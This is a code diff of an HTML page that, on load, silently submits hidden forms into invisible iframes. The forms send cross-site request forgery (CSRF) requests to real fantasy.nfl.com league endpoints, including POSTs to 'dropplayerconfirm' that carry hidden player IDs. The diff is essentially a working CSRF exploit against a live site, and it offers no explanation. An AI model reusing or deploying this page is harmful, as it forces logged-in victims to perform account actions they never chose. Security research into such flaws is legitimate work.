@@ -26,7 +26,7 @@
 
             window.onload = function() {
                 document.getElementById("csrfForm0").submit();
-                wait(5000)          
+                wait(10000)          
                 document.getElementById("csrfForm1").submit();
                 document.getElementById("csrfForm2").submit();
             }
@@ -43,19 +43,20 @@
     </head>
     <body>
 
-        <form id="csrfForm0" action=https://fantasy.nfl.com method="GET" target="csrfIframe0">
+        <form id="csrfForm0" action=https://fantasy.nfl.com/league/12612802/team/1/tradingblock method="GET" target="csrfIframe0">
         </form>
         
         <form id="csrfForm1" action=https://fantasy.nfl.com/league/12612802/team/1/dropplayerconfirm method="POST" target="csrfIframe1">
-            <input type="hidden" name="dropPlayerId&#91;&#93;" value="2569726" />
+            <input type="hidden" name="dropPlayerId&#91;&#93;" value="2568435" />
             <!-- fill in form data here -->
         </form>
 
         <form id="csrfForm2" action=https://fantasy.nfl.com/league/12612802/team/1/dropplayerconfirm method="POST" target="csrfIframe2">
-            <input type="hidden" name="dropPlayerId&#91;&#93;" value="2567973" />
+            <input type="hidden" name="dropPlayerId&#91;&#93;" value="100006" />
         </form>
 
         <!-- hidden iframes -->
+
         <iframe style="display: hidden" height="0" width="0" frameborder="0" name="csrfIframe1"></iframe>
         <iframe style="display: hidden" height="0" width="0" frameborder="0" name="csrfIframe2"></iframe>
 
